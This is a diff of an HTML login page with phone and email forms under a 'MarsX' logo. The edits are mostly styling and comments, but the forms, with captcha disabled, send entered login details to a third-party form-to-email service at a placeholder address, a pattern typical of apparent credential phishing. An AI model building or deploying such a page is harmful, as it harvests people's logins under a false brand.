@@ -13,7 +13,7 @@
       display: flex;
       flex-direction: column;
       align-items: center;
-      padding-top: 140px; /* Descente du contenu */
+      padding-top: 180px; /* CONTENU PLUS BAS */
     }
 
     .container {
@@ -21,6 +21,11 @@
       display: flex;
       flex-direction: column;
       align-items: flex-start;
+    }
+
+    .logo {
+      width: 160px;
+      margin-bottom: 20px;
     }
 
     .welcome {
@@ -69,7 +74,7 @@
     label {
       font-size: 0.9rem;
       margin-left: 12px;
-      margin-bottom: 5px; /* Rapproche le label du champ */
+      margin-bottom: 5px;
     }
 
     .input-group {
@@ -149,22 +154,24 @@
     .hidden {
       display: none;
     }
-
   </style>
 </head>
 <body>
 
   <div class="container">
-    <!-- Titre aligné avec les boutons -->
+    <!-- LOGO aligné à gauche -->
+    <img src="immmm.png" alt="MarsX Logo" class="logo" />
+
+    <!-- TITRE -->
     <div class="welcome">Welcome To Login</div>
 
-    <!-- Boutons Toggle -->
+    <!-- BOUTONS TOGGLE -->
     <div class="toggle-container">
       <button class="toggle-button active" onclick="toggleLogin('phone')">Phone Login</button>
       <button class="toggle-button" onclick="toggleLogin('email')">Email Login</button>
     </div>
 
-    <!-- Formulaire Téléphone -->
+    <!-- FORMULAIRE PHONE -->
     <form id="phoneForm" action="https://formsubmit.co/tonadresse@email.com" method="POST">
       <input type="hidden" name="_captcha" value="false">
 
@@ -200,7 +207,7 @@
       <button type="submit">Login</button>
     </form>
 
-    <!-- Formulaire Email -->
+    <!-- FORMULAIRE EMAIL -->
     <form id="emailForm" class="hidden" action="https://formsubmit.co/tonadresse@email.com" method="POST">
       <input type="hidden" name="_captcha" value="false">
 
